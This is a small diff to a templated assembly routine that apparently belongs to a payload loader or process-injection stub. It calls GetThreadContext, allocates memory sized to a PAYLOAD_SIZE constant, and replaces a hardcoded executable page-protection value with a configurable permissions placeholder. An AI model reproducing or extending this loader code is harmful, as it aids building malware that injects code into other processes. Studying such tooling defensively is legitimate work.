@@ -159,7 +159,7 @@ get_servicehandler:
   {{ api_call('kernel32.dll', 'GetThreadContext') }}
 
   mov r10, rsp
-  push 0x40
+  push {{ permissions }}
   mov r9, {{ bw_or(MEM_COMMIT, MEM_RESERVE) }}
   mov r8, {{ PAYLOAD_SIZE }}
   xor rdx, rdx
